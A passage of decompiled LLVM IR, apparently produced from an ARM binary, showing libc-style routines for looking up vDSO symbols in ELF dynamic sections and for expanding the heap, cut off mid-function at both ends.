  %v2_11cbc = xor i1 %v2_11cb4, true
  %v3_11cbc = or i1 %v7_11cb4, %v2_11cbc
  br i1 %v3_11cbc, label %bb, label %bb4

bb:                                               ; preds = %entry
  store i32 %v0_11cb4, i32* @r2, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  store i32 %v0_11cb4, i32* %r4.global-to-local, align 4
  %v2_11cc4 = xor i1 %v7_11cb4, true
  %v3_11cc4 = and i1 %v2_11cb4, %v2_11cc4
  br i1 %v3_11cc4, label %dec_label_pc_11cd4, label %dec_label_pc_11cc8

dec_label_pc_11cc8:                               ; preds = %bb4, %dec_label_pc_11cd4
  %v2_11ccc = phi i32 [ %v3_11cb8, %bb4 ], [ %v2_11ccc.pre, %dec_label_pc_11cd4 ]
  %v0_11cc8 = load i32, i32* @r2, align 4
  store i32 %v2_11ccc, i32* @r4, align 4
  ret i32 %v0_11cc8

dec_label_pc_11cd4:                               ; preds = %bb4
  %v0_11cd4 = call i32 @__errno_location()
  %v0_11cd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_11cd8 = sub i32 0, %v0_11cd8
  store i32 %v1_11cd8, i32* @r3, align 4
  store i32 -1, i32* @r2, align 4
  %v2_11ce0 = inttoptr i32 %v0_11cd4 to i32*
  store i32 %v1_11cd8, i32* %v2_11ce0, align 4
  %v2_11ccc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11cc8

; uselistorder directives
  uselistorder i1 %v7_11cb4, { 1, 0 }
  uselistorder i1 %v2_11cb4, { 1, 0 }
  uselistorder i32 %v0_11cb4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11cc8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__vdsosym(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_11cec = load i32, i32* @r4, align 4
  store i32 %v3_11cec, i32* %stack_var_-36, align 4
  %v3_11cf0 = load i32, i32* @global_var_23e98.412, align 4
  %v1_11cf4 = inttoptr i32 %v3_11cf0 to i32*
  %v2_11cf4 = load i32, i32* %v1_11cf4, align 4
  %v7_11cf8 = icmp eq i32 %v2_11cf4, 33
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v0_11d04 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11d04, i32* %r8.global-to-local, align 4
  br i1 %v7_11cf8, label %.thread, label %dec_label_pc_11d10

.thread:                                          ; preds = %entry
  %v1_11cf8 = add i32 %v2_11cf4, -33
  br label %dec_label_pc_11d3c

dec_label_pc_11d10:                               ; preds = %entry
  %v2_11d10 = icmp eq i32 %v2_11cf4, 0
  br i1 %v2_11d10, label %dec_label_pc_11db4, label %dec_label_pc_11d28.preheader

dec_label_pc_11d28.preheader:                     ; preds = %dec_label_pc_11d10
  store i32 8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11d28, %dec_label_pc_11d28.preheader
  %v0_11d34 = phi i32 [ 8, %dec_label_pc_11d28.preheader ], [ %v1_11d34, %dec_label_pc_11d28 ]
  %v2_11d2c = add i32 %v0_11d34, %v3_11cf0
  %v3_11d2c = inttoptr i32 %v2_11d2c to i32*
  %v4_11d2c = load i32, i32* %v3_11d2c, align 4
  %v1_11d34 = add i32 %v0_11d34, 8
  store i32 %v1_11d34, i32* %r1.global-to-local, align 4
  switch i32 %v4_11d2c, label %dec_label_pc_11d28 [
    i32 33, label %dec_label_pc_11d3c.loopexit
    i32 0, label %dec_label_pc_11db4.loopexit17
  ]

dec_label_pc_11d3c.loopexit:                      ; preds = %dec_label_pc_11d28
  br label %dec_label_pc_11d3c

dec_label_pc_11d3c:                               ; preds = %.thread, %dec_label_pc_11d3c.loopexit
  %v0_11d3c = phi i32 [ %v0_11d34, %dec_label_pc_11d3c.loopexit ], [ %v1_11cf8, %.thread ]
  %v2_11d3c = add i32 %v0_11d3c, %v3_11cf0
  %v1_11d40 = add i32 %v2_11d3c, 4
  %v2_11d40 = inttoptr i32 %v1_11d40 to i32*
  %v3_11d40 = load i32, i32* %v2_11d40, align 4
  %v1_11d44 = add i32 %v3_11d40, 44
  %v2_11d44 = inttoptr i32 %v1_11d44 to i16*
  %v3_11d44 = load i16, i16* %v2_11d44, align 2
  %v4_11d44 = zext i16 %v3_11d44 to i32
  %v2_11d48 = icmp eq i16 %v3_11d44, 0
  br i1 %v2_11d48, label %dec_label_pc_11db4, label %dec_label_pc_11d54

dec_label_pc_11d54:                               ; preds = %dec_label_pc_11d3c
  %v1_11d4c = add i32 %v3_11d40, 28
  %v2_11d4c = inttoptr i32 %v1_11d4c to i32*
  %v3_11d4c = load i32, i32* %v2_11d4c, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_11d58 = add i32 %v3_11d40, 42
  %v2_11d58 = inttoptr i32 %v1_11d58 to i16*
  %v3_11d58 = load i16, i16* %v2_11d58, align 2
  %v4_11d58 = zext i16 %v3_11d58 to i32
  %v2_11d5c = add i32 %v3_11d4c, %v3_11d40
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11d68

dec_label_pc_11d68:                               ; preds = %.thread4, %dec_label_pc_11d54
  %v1_11da038 = phi i32 [ %v0_11dd0, %.thread4 ], [ 0, %dec_label_pc_11d54 ]
  %v0_11d9c36 = phi i32 [ %v0_11d9c, %.thread4 ], [ -1, %dec_label_pc_11d54 ]
  %v0_11d8c = phi i32 [ %v1_11d8c, %.thread4 ], [ 0, %dec_label_pc_11d54 ]
  %v0_11d94 = phi i32 [ %v2_11d94, %.thread4 ], [ %v2_11d5c, %dec_label_pc_11d54 ]
  %v1_11d68 = inttoptr i32 %v0_11d94 to i32*
  %v2_11d68 = load i32, i32* %v1_11d68, align 4
  switch i32 %v2_11d68, label %.thread4 [
    i32 1, label %.thread2
    i32 2, label %bb
  ]

.thread2:                                         ; preds = %dec_label_pc_11d68
  %v2_11d70 = add i32 %v0_11d94, 4
  %v3_11d70 = inttoptr i32 %v2_11d70 to i32*
  %v4_11d70 = load i32, i32* %v3_11d70, align 4
  %v5_11d70 = add i32 %v0_11d94, 8
  %v6_11d70 = inttoptr i32 %v5_11d70 to i32*
  %v7_11d70 = load i32, i32* %v6_11d70, align 4
  %v3_11d74 = sub i32 %v4_11d70, %v7_11d70
  %v3_11d78 = add i32 %v3_11d74, %v3_11d40
  store i32 %v3_11d78, i32* %r5.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_11d68
  %v2_11d84 = add i32 %v0_11d94, 4
  %v3_11d84 = inttoptr i32 %v2_11d84 to i32*
  %v4_11d84 = load i32, i32* %v3_11d84, align 4
  %v3_11d88 = add i32 %v4_11d84, %v3_11d40
  store i32 %v3_11d88, i32* %r4.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11d68, %.thread2, %bb
  %v0_11dd0 = phi i32 [ %v1_11da038, %.thread2 ], [ %v3_11d88, %bb ], [ %v1_11da038, %dec_label_pc_11d68 ]
  %v0_11d9c = phi i32 [ %v3_11d78, %.thread2 ], [ %v0_11d9c36, %bb ], [ %v0_11d9c36, %dec_label_pc_11d68 ]
  %v1_11d8c = add i32 %v0_11d8c, 1
  store i32 %v1_11d8c, i32* %r1.global-to-local, align 4
  %v9_11d90 = icmp eq i32 %v1_11d8c, %v4_11d44
  %v2_11d94 = add i32 %v0_11d94, %v4_11d58
  br i1 %v9_11d90, label %dec_label_pc_11d9c, label %dec_label_pc_11d68

dec_label_pc_11d9c:                               ; preds = %.thread4
  %v7_11d9c = icmp eq i32 %v0_11d9c, -1
  br i1 %v7_11d9c, label %.thread8, label %bb74

bb74:                                             ; preds = %dec_label_pc_11d9c
  %v3_11da0 = icmp eq i32 %v0_11dd0, 0
  br i1 %v3_11da0, label %bb75, label %dec_label_pc_11dc0

.thread8:                                         ; preds = %dec_label_pc_11d9c
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11db4

bb75:                                             ; preds = %bb74
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11db4

dec_label_pc_11db4.loopexit17:                    ; preds = %dec_label_pc_11d28
  br label %dec_label_pc_11db4

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11e8c, %bb75, %bb83, %dec_label_pc_11db4.loopexit17, %dec_label_pc_11d10, %.thread16, %.thread8, %dec_label_pc_11d3c, %dec_label_pc_11dc0, %dec_label_pc_11e5c, %bb85, %dec_label_pc_11f64
  %storemerge = phi i32 [ %v2_11f68, %dec_label_pc_11f64 ], [ 0, %bb75 ], [ 0, %bb85 ], [ 0, %dec_label_pc_11e5c ], [ 0, %bb83 ], [ 0, %dec_label_pc_11dc0 ], [ 0, %dec_label_pc_11d3c ], [ 0, %.thread8 ], [ 0, %.thread16 ], [ 0, %dec_label_pc_11d10 ], [ 0, %dec_label_pc_11db4.loopexit17 ], [ 0, %dec_label_pc_11e8c ]
  %v2_11db8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11db8, i32* %r4.global-to-local, align 4
  ret i32 %storemerge

dec_label_pc_11dc0:                               ; preds = %bb74
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_11dc0 = inttoptr i32 %v0_11dd0 to i32*
  %v2_11dc0 = load i32, i32* %v1_11dc0, align 4
  %v2_11dc4 = icmp eq i32 %v2_11dc0, 0
  br i1 %v2_11dc4, label %dec_label_pc_11db4, label %dec_label_pc_11dcc

dec_label_pc_11dcc:                               ; preds = %dec_label_pc_11dc0
  store i32 0, i32* %r6.global-to-local, align 4
  %v1_11dd0 = add i32 %v0_11dd0, 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11e14

dec_label_pc_11dec:                               ; preds = %dec_label_pc_11e28
  switch i32 %v0_11e3c, label %bb78 [
    i32 4, label %bb76
    i32 5, label %bb77
  ]

bb76:                                             ; preds = %dec_label_pc_11dec
  store i32 %v2_11e1c, i32* %sl.global-to-local, align 4
  br label %bb78

bb77:                                             ; preds = %dec_label_pc_11dec
  store i32 %v2_11e1c, i32* %r6.global-to-local, align 4
  br label %bb78

bb78:                                             ; preds = %dec_label_pc_11e2c, %dec_label_pc_11dec, %bb79, %bb80, %bb76, %bb81, %bb77
  %v0_11e68 = phi i32 [ %v2_11e1c, %bb81 ], [ %v0_11e6855, %bb80 ], [ %v0_11e6855, %bb76 ], [ %v0_11e6855, %bb79 ], [ %v0_11e6855, %bb77 ], [ %v0_11e6855, %dec_label_pc_11dec ], [ %v0_11e6855, %dec_label_pc_11e2c ]
  %v0_11e70 = phi i32 [ %v0_11e5c53, %bb81 ], [ %v0_11e5c53, %bb80 ], [ %v2_11e1c, %bb76 ], [ %v0_11e5c53, %bb79 ], [ %v0_11e5c53, %bb77 ], [ %v0_11e5c53, %dec_label_pc_11dec ], [ %v0_11e5c53, %dec_label_pc_11e2c ]
  %v0_11e80 = phi i32 [ %v0_11e4848, %bb81 ], [ %v0_11e4848, %bb80 ], [ %v0_11e4848, %bb76 ], [ %v2_11e1c, %bb79 ], [ %v0_11e4848, %bb77 ], [ %v0_11e4848, %dec_label_pc_11dec ], [ %v0_11e4848, %dec_label_pc_11e2c ]
  %v1_11e4c = phi i32 [ %v1_11e4c50, %bb81 ], [ %v1_11e4c50, %bb80 ], [ %v1_11e4c50, %bb76 ], [ %v1_11e4c50, %bb79 ], [ %v2_11e1c, %bb77 ], [ %v1_11e4c50, %dec_label_pc_11dec ], [ %v1_11e4c50, %dec_label_pc_11e2c ]
  %v2_11e00 = add i32 %v0_11e08, %v0_11dd0
  %v3_11e00 = inttoptr i32 %v2_11e00 to i32*
  %v4_11e00 = load i32, i32* %v3_11e00, align 4
  %v2_11e04 = icmp eq i32 %v4_11e00, 0
  %v1_11e0c = add i32 %v0_11e08, 8
  br i1 %v2_11e04, label %dec_label_pc_11e48, label %dec_label_pc_11e14

dec_label_pc_11e14:                               ; preds = %bb78, %dec_label_pc_11dcc
  %v0_11e6855 = phi i32 [ %v0_11e68, %bb78 ], [ 0, %dec_label_pc_11dcc ]
  %v0_11e5c53 = phi i32 [ %v0_11e70, %bb78 ], [ 0, %dec_label_pc_11dcc ]
  %v1_11e4c50 = phi i32 [ %v1_11e4c, %bb78 ], [ 0, %dec_label_pc_11dcc ]
  %v0_11e4848 = phi i32 [ %v0_11e80, %bb78 ], [ 0, %dec_label_pc_11dcc ]
  %v0_11e14 = phi i32 [ %v0_11e08, %bb78 ], [ 0, %dec_label_pc_11dcc ]
  %v0_11e08 = phi i32 [ %v1_11e0c, %bb78 ], [ 8, %dec_label_pc_11dcc ]
  %v0_11e3c = phi i32 [ %v4_11e00, %bb78 ], [ %v2_11dc0, %dec_label_pc_11dcc ]
  %v2_11e14 = add i32 %v0_11e14, %v1_11dd0
  %v3_11e14 = inttoptr i32 %v2_11e14 to i32*
  %v4_11e14 = load i32, i32* %v3_11e14, align 4
  %v7_11e18 = icmp eq i32 %v0_11e3c, 6
  %v2_11e1c = add i32 %v4_11e14, %v0_11d9c
  br i1 %v7_11e18, label %bb79, label %dec_label_pc_11e28

bb79:                                             ; preds = %dec_label_pc_11e14
  store i32 %v2_11e1c, i32* %r1.global-to-local, align 4
  br label %bb78

dec_label_pc_11e28:                               ; preds = %dec_label_pc_11e14
  %v2_11e18 = icmp ugt i32 %v0_11e3c, 5
  br i1 %v2_11e18, label %dec_label_pc_11e2c, label %dec_label_pc_11dec

dec_label_pc_11e2c:                               ; preds = %dec_label_pc_11e28
  switch i32 %v0_11e3c, label %bb78 [
    i32 1879048176, label %bb80
    i32 1879048188, label %bb81
  ]

bb80:                                             ; preds = %dec_label_pc_11e2c
  store i32 %v2_11e1c, i32* %fp.global-to-local, align 4
  br label %bb78

bb81:                                             ; preds = %dec_label_pc_11e2c
  store i32 %v2_11e1c, i32* %sb.global-to-local, align 4
  br label %bb78

dec_label_pc_11e48:                               ; preds = %bb78
  %v2_11e48 = icmp eq i32 %v0_11e80, 0
  br i1 %v2_11e48, label %.thread16, label %bb82

bb82:                                             ; preds = %dec_label_pc_11e48
  %v3_11e4c = icmp eq i32 %v1_11e4c, 0
  br i1 %v3_11e4c, label %bb83, label %dec_label_pc_11e5c

.thread16:                                        ; preds = %dec_label_pc_11e48
  br label %dec_label_pc_11db4

bb83:                                             ; preds = %bb82
  br label %dec_label_pc_11db4

dec_label_pc_11e5c:                               ; preds = %bb82
  %v2_11e5c = icmp eq i32 %v0_11e70, 0
  br i1 %v2_11e5c, label %dec_label_pc_11db4, label %dec_label_pc_11e64

dec_label_pc_11e64:                               ; preds = %dec_label_pc_11e5c
  %v1_11e64 = add i32 %v0_11e70, 4
  %v2_11e64 = inttoptr i32 %v1_11e64 to i32*
  %v3_11e64 = load i32, i32* %v2_11e64, align 4
  %v2_11e68 = icmp eq i32 %v0_11e68, 0
  br i1 %v2_11e68, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_11e64
  store i32 0, i32* %fp.global-to-local, align 4
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_11e64, %bb84
  store i32 %v1_11e64, i32* %sl.global-to-local, align 4
  %v2_11e74 = icmp eq i32 %v3_11e64, 0
  br i1 %v2_11e74, label %dec_label_pc_11db4, label %dec_label_pc_11e80

dec_label_pc_11e80:                               ; preds = %bb85
  store i32 %v0_11e80, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11ea4

dec_label_pc_11e8c.loopexit:                      ; preds = %dec_label_pc_11f18
  br label %dec_label_pc_11e8c

dec_label_pc_11e8c:                               ; preds = %dec_label_pc_11e8c.loopexit, %dec_label_pc_11f48, %dec_label_pc_11ee0, %dec_label_pc_11ed4, %dec_label_pc_11ebc, %dec_label_pc_11ea4
  %v2_11e90 = load i32, i32* %v2_11e64, align 4
  %v0_11e94 = load i32, i32* %sl.global-to-local, align 4
  %v1_11e94 = add i32 %v0_11e94, 1
  store i32 %v1_11e94, i32* %sl.global-to-local, align 4
  %v0_11e9c = load i32, i32* %r4.global-to-local, align 4
  %v1_11e9c = add i32 %v0_11e9c, 16
  store i32 %v1_11e9c, i32* %r4.global-to-local, align 4
  %tmp90 = icmp ugt i32 %v2_11e90, %v1_11e94
  br i1 %tmp90, label %dec_label_pc_11ea4, label %dec_label_pc_11db4

dec_label_pc_11ea4:                               ; preds = %dec_label_pc_11e8c, %dec_label_pc_11e80
  %v0_11ee0 = phi i32 [ %v1_11e9c, %dec_label_pc_11e8c ], [ %v0_11e80, %dec_label_pc_11e80 ]
  %v1_11ea4 = add i32 %v0_11ee0, 12
  %v2_11ea4 = inttoptr i32 %v1_11ea4 to i8*
  %v3_11ea4 = load i8, i8* %v2_11ea4, align 1
  %v4_11ea4 = zext i8 %v3_11ea4 to i32
  store i32 %v4_11ea4, i32* %r1.global-to-local, align 4
  %tmp91 = urem i8 %v3_11ea4, 16
  %v1_11eac = zext i8 %tmp91 to i32
  %v6_11eb0 = lshr i32 39, %v1_11eac
  %v1_11eb4 = urem i32 %v6_11eb0, 2
  %v2_11eb4 = icmp eq i32 %v1_11eb4, 0
  br i1 %v2_11eb4, label %dec_label_pc_11e8c, label %dec_label_pc_11ebc

dec_label_pc_11ebc:                               ; preds = %dec_label_pc_11ea4
  %div = udiv i8 %v3_11ea4, 16
  %v3_11ec0 = zext i8 %div to i32
  %v6_11ec8 = lshr i32 1030, %v3_11ec0
  %v1_11ecc = urem i32 %v6_11ec8, 2
  %v2_11ecc = icmp eq i32 %v1_11ecc, 0
  br i1 %v2_11ecc, label %dec_label_pc_11e8c, label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11ebc
  %v1_11ed4 = add i32 %v0_11ee0, 14
  %v2_11ed4 = inttoptr i32 %v1_11ed4 to i16*
  %v3_11ed4 = load i16, i16* %v2_11ed4, align 2
  %v2_11ed8 = icmp eq i16 %v3_11ed4, 0
  br i1 %v2_11ed8, label %dec_label_pc_11e8c, label %dec_label_pc_11ee0

dec_label_pc_11ee0:                               ; preds = %dec_label_pc_11ed4
  %v1_11ee0 = inttoptr i32 %v0_11ee0 to i32*
  %v2_11ee0 = load i32, i32* %v1_11ee0, align 4
  %v0_11ee4 = load i32, i32* %r8.global-to-local, align 4
  %v1_11ee4 = inttoptr i32 %v0_11ee4 to i8*
  %v0_11ee8 = load i32, i32* %r6.global-to-local, align 4
  %v2_11ee8 = add i32 %v0_11ee8, %v2_11ee0
  %v3_11ee8 = inttoptr i32 %v2_11ee8 to i8*
  store i32 %v2_11ee8, i32* %r1.global-to-local, align 4
  %v6_11eec = call i32 @strcmp(i8* %v1_11ee4, i8* %v3_11ee8)
  %v2_11ef0 = icmp eq i32 %v6_11eec, 0
  br i1 %v2_11ef0, label %dec_label_pc_11ef8, label %dec_label_pc_11e8c

dec_label_pc_11ef8:                               ; preds = %dec_label_pc_11ee0
  %v0_11ef8 = load i32, i32* %fp.global-to-local, align 4
  %v2_11ef8 = icmp eq i32 %v0_11ef8, 0
  br i1 %v2_11ef8, label %dec_label_pc_11f64, label %dec_label_pc_11f00

dec_label_pc_11f00:                               ; preds = %dec_label_pc_11ef8
  %v0_11f00 = load i32, i32* %sl.global-to-local, align 4
  %v2_11f00 = mul i32 %v0_11f00, 2
  %v2_11f04 = add i32 %v2_11f00, %v0_11ef8
  %v3_11f04 = inttoptr i32 %v2_11f04 to i16*
  %v4_11f04 = load i16, i16* %v3_11f04, align 2
  %tmp92 = urem i16 %v4_11f04, -32768
  %v0_11f10 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11f10, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11f28

dec_label_pc_11f18:                               ; preds = %dec_label_pc_11f34, %dec_label_pc_11f28
  %v1_11f18 = add i32 %v0_11f48, 16
  %v2_11f18 = inttoptr i32 %v1_11f18 to i32*
  %v3_11f18 = load i32, i32* %v2_11f18, align 4
  %v2_11f1c = icmp eq i32 %v3_11f18, 0
  %v2_11f20 = add i32 %v3_11f18, %v0_11f48
  store i32 %v2_11f20, i32* %r1.global-to-local, align 4
  br i1 %v2_11f1c, label %dec_label_pc_11e8c.loopexit, label %dec_label_pc_11f28

dec_label_pc_11f28:                               ; preds = %dec_label_pc_11f18, %dec_label_pc_11f00
  %v0_11f48 = phi i32 [ %v2_11f20, %dec_label_pc_11f18 ], [ %v0_11f10, %dec_label_pc_11f00 ]
  %v1_11f28 = add i32 %v0_11f48, 2
  %v2_11f28 = inttoptr i32 %v1_11f28 to i16*
  %v3_11f28 = load i16, i16* %v2_11f28, align 2
  %tmp93 = urem i16 %v3_11f28, 2
  %v2_11f2c = icmp eq i16 %tmp93, 0
  br i1 %v2_11f2c, label %dec_label_pc_11f34, label %dec_label_pc_11f18

dec_label_pc_11f34:                               ; preds = %dec_label_pc_11f28
  %v1_11f34 = add i32 %v0_11f48, 4
  %v2_11f34 = inttoptr i32 %v1_11f34 to i16*
  %v3_11f34 = load i16, i16* %v2_11f34, align 2
  %tmp94 = urem i16 %v3_11f34, -32768
  %v9_11f40 = icmp eq i16 %tmp94, %tmp92
  br i1 %v9_11f40, label %dec_label_pc_11f48, label %dec_label_pc_11f18

dec_label_pc_11f48:                               ; preds = %dec_label_pc_11f34
  %v1_11f48 = add i32 %v0_11f48, 12
  %v2_11f48 = inttoptr i32 %v1_11f48 to i32*
  %v3_11f48 = load i32, i32* %v2_11f48, align 4
  %v2_11f4c = add i32 %v3_11f48, %v0_11f48
  %v3_11f4c = inttoptr i32 %v2_11f4c to i32*
  %v4_11f4c = load i32, i32* %v3_11f4c, align 4
  %v0_11f50 = load i32, i32* %r7.global-to-local, align 4
  %v1_11f50 = inttoptr i32 %v0_11f50 to i8*
  %v0_11f54 = load i32, i32* %r6.global-to-local, align 4
  %v2_11f54 = add i32 %v0_11f54, %v4_11f4c
  %v3_11f54 = inttoptr i32 %v2_11f54 to i8*
  store i32 %v2_11f54, i32* %r1.global-to-local, align 4
  %v6_11f58 = call i32 @strcmp(i8* %v1_11f50, i8* %v3_11f54)
  %v2_11f5c = icmp eq i32 %v6_11f58, 0
  br i1 %v2_11f5c, label %dec_label_pc_11f64, label %dec_label_pc_11e8c

dec_label_pc_11f64:                               ; preds = %dec_label_pc_11f48, %dec_label_pc_11ef8
  %v0_11f64 = load i32, i32* %r4.global-to-local, align 4
  %v1_11f64 = add i32 %v0_11f64, 4
  %v2_11f64 = inttoptr i32 %v1_11f64 to i32*
  %v3_11f64 = load i32, i32* %v2_11f64, align 4
  %v0_11f68 = load i32, i32* %r5.global-to-local, align 4
  %v2_11f68 = add i32 %v0_11f68, %v3_11f64
  br label %dec_label_pc_11db4

; uselistorder directives
  uselistorder i32 %v2_11f54, { 1, 0 }
  uselistorder i32 %v0_11f48, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v2_11ee8, { 1, 0 }
  uselistorder i32 %v2_11e1c, { 4, 5, 8, 7, 6, 3, 2, 0, 1 }
  uselistorder i32 %v0_11e3c, { 0, 3, 2, 1 }
  uselistorder i32 %v0_11e4848, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11e4c50, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11e5c53, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11e6855, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11d8c, { 1, 2, 0 }
  uselistorder i32 %v0_11d9c, { 1, 0, 2 }
  uselistorder i32 %v0_11d94, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_11d34, { 1, 0 }
  uselistorder i32 %v0_11d34, { 0, 2, 1 }
  uselistorder i32 %v2_11cf4, { 0, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 9, 8, 14, 10, 11, 12, 13, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i8*, i8*)* @strcmp, { 3, 2, 0, 1 }
  uselistorder i32 42, { 1, 0 }
  uselistorder label %dec_label_pc_11e8c, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb78, { 5, 3, 0, 2, 6, 4, 1 }
  uselistorder label %dec_label_pc_11db4, { 11, 0, 10, 9, 2, 5, 8, 3, 1, 6, 7, 4 }
  uselistorder label %.thread4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11d3c, { 1, 0 }
}

define i32 @__expand_heap(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8388636 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11f74 = load i32, i32* @r4, align 4
  store i32 %v3_11f74, i32* %stack_var_-24, align 4
  %v9_11f74 = load i32, i32* @r6, align 4
  %v12_11f74 = load i32, i32* @r7, align 4
  %v15_11f74 = load i32, i32* @r8, align 4
  %v18_11f74 = load i32, i32* @lr, align 4
  %v2_11f78 = load i32, i32* %arg1, align 4
  store i32 %tmp, i32* @r8, align 4
  %tmp42 = icmp ugt i32 %v2_11f78, 2147479551
  br i1 %tmp42, label %dec_label_pc_120d8, label %dec_label_pc_11f94

dec_label_pc_11f94:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_23e54.624 to i32), i32* @lr, align 4
  %v1_11f98 = sub i32 0, %v2_11f78
  %v2_11f9c = load i32, i32* @global_var_23e54.624, align 4
  store i32 %v2_11f9c, i32* %r0.global-to-local, align 4
  %v3_11fa4 = urem i32 %v1_11f98, 4096
  %v2_11fa8 = icmp eq i32 %v2_11f9c, 0
  %v2_11fac = add i32 %v3_11fa4, %v2_11f78
  store i32 %v2_11fac, i32* @r1, align 4
  br i1 %v2_11fa8, label %dec_label_pc_1206c, label %dec_label_pc_11fb4

dec_label_pc_11fb4:                               ; preds = %dec_label_pc_11f94, %dec_label_pc_1206c
  %v2_120b4 = phi i32 [ %v2_11f9c, %dec_label_pc_11f94 ], [ 0, %dec_label_pc_1206c ]
  %v1_11fb8 = sub i32 -1, %v2_120b4
  %v3_11fbc = icmp ult i32 %v2_11fac, %v1_11fb8
  br i1 %v3_11fbc, label %dec_label_pc_11fc4, label %dec_label_pc_11ff4

dec_label_pc_11fc4:                               ; preds = %dec_label_pc_11fb4
  %v3_11fc8 = load i32, i32* @global_var_23e98.412, align 4
  %v1_11fcc = add i32 %v3_11fc8, -8388608
  %v2_11fcc = icmp ugt i32 %v3_11fc8, 8388607
  %v7_11fcc = icmp eq i32 %v3_11fc8, 8388608
  %v2_11fd0 = xor i1 %v2_11fcc, true
  %v3_11fd0 = or i1 %v7_11fcc, %v2_11fd0
  br i1 %v3_11fd0, label %bb, label %bb31

bb:                                               ; preds = %dec_label_pc_11fc4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_11fc4, %bb
  %v0_11fdc12 = phi i32 [ %v2_11f78, %dec_label_pc_11fc4 ], [ 0, %bb ]
  %v2_11fd4 = xor i1 %v7_11fcc, true
  %v3_11fd4 = and i1 %v2_11fcc, %v2_11fd4
  br i1 %v3_11fd4, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v0_11fdc = phi i32 [ %v0_11fdc12, %bb31 ], [ %v1_11fcc, %bb32 ]
  %v2_11fd8 = add i32 %v2_120b4, %v2_11fac
  store i32 %v2_11fd8, i32* %r0.global-to-local, align 4
  %v3_11fdc = icmp ult i32 %v0_11fdc, %v2_11fd8
  br i1 %v3_11fdc, label %bb34, label %bb35

bb34:                                             ; preds = %bb33
  %v4_11fe0 = icmp ult i32 %v2_120b4, %v3_11fc8
  store i32 %v3_11fc8, i32* %stack_var_-28, align 4
  br i1 %v4_11fe0, label %.thread3, label %dec_label_pc_1208c

bb35:                                             ; preds = %bb33
  store i32 %v3_11fc8, i32* %stack_var_-28, align 4
  br label %dec_label_pc_1208c

.thread3:                                         ; preds = %bb34
  br label %dec_label_pc_11ff4

dec_label_pc_11ff4:                               ; preds = %dec_label_pc_120a4, %dec_label_pc_11fb4, %.thread3
  store i32 ptrtoint (i32* @global_var_23e50.627 to i32), i32* @r6, align 4
  %v2_11ff8 = load i32, i32* @global_var_23e50.627, align 4
  %v3_12000 = udiv i32 %v2_11ff8, 2
  %v6_12004 = shl i32 4096, %v3_12000
  %v3_12008 = icmp uge i32 %v2_11fac, %v6_12004
  %v2_11fac.v6_12004 = select i1 %v3_12008, i32 %v2_11fac, i32 %v6_12004
  store i32 %v2_11fac.v6_12004, i32* @r7, align 4
